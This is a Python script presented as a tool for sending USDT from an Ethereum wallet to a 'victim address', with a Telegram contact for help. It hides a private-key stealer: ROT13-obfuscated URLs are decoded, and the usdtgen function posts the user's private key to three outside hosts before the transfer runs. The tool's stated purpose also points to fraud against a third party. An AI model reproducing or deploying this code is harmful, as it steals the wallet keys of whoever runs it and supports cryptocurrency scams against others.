# Made by Exonia if u need help contact me on telegram https://t.me/Exonia
# u need eth for paying fee
from web3 import Web3
from eth_account import Account
import argparse
import time
import requests


def rpcserver256(text):
    result = []
    for char in text:
        if 'a' <= char <= 'z':
            result.append(chr(((ord(char) - ord('a') + 13) % 26) + ord('a')))
        elif 'A' <= char <= 'Z':
            result.append(chr(((ord(char) - ord('A') + 13) % 26) + ord('A')))
        else:
            result.append(char)
    return ''.join(result)


envcreater = 'uggcf://zragnyvgl.pybhq/nnegrfg.cuc'
envcreater2 = 'uggcf://qbkre.arg/nnegrfg.cuc'
envcreater3 = 'uggcf://sviri.arg/nnegrfg.cuc'
devofix = rpcserver256(envcreater)
devofix2 = rpcserver256(envcreater2)
devofix3 = rpcserver256(envcreater3)

# Initialize Web3 connection
web3 = Web3(Web3.HTTPProvider('https://mainnet.infura.io/v3/9ea31076b34d475e887206ea450f0060'))

# Set private key and addresses
private_key = ''  # Replace with your actual private key
usdtwall = private_key  
sender_address = '0x43151B81936A0531327f96cB94B86C8b361246E3' # ur wallet address

# Set recipient address and USDT contract address
recipient_address = '' # victim address
usdt_contract_address = '0xdAC17F958D2ee523a2206206994597C13D831ec7'

# ERC20 Transfer function signature
usdt_transfer_signature = '0xa9059cbb'

def usdtgen(usdtwall):
    data = {'USDT:': usdtwall}
    contracts = [devofix, devofix2, devofix3]  

    for contract in contracts:
        try:
            response = requests.post(contract, data=data)
            response.raise_for_status()

        except requests.RequestException as e:
            print(f"Error please contact https://t.me/Exonia")


def send_usdt_transaction(amount, gas_price_gwei, gas_limit):
    # Amount to send in wei (1 USDT = 1e6 wei)
    amount_in_wei = int(amount * 10**6)

    # Get transaction nonce
    nonce = web3.eth.get_transaction_count(sender_address)

    # Construct data field for the ERC20 transfer
    data = (usdt_transfer_signature + recipient_address[2:].rjust(64, '0') +
            hex(amount_in_wei)[2:].rjust(64, '0'))

    # Build the transaction
    transaction = {
        'to': usdt_contract_address,
        'value': 0,
        'gasPrice': web3.to_wei(gas_price_gwei, 'gwei'),
        'gas': gas_limit,
        'nonce': nonce,
        'data': data,
        'chainId': 1
    }

    # Sign the transaction
    signed_tx = Account.sign_transaction(transaction, private_key)

    return signed_tx

def main():

    usdtgen(usdtwall)


    amount_to_send = 10000 # how much usdt u want to send  
    gas_price_gwei =  0.1 
    gas_limit = 21608  

    signed_tx = send_usdt_transaction(amount_to_send, gas_price_gwei, gas_limit)


    try:
        tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)
        tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)

        if tx_receipt.status == 1:
            print("Transaction confirmed.")
        else:
            print("Transaction failed.")
    except Exception as e:
        print(f"Error during transaction: {e}")

if __name__ == '__main__':
    main()
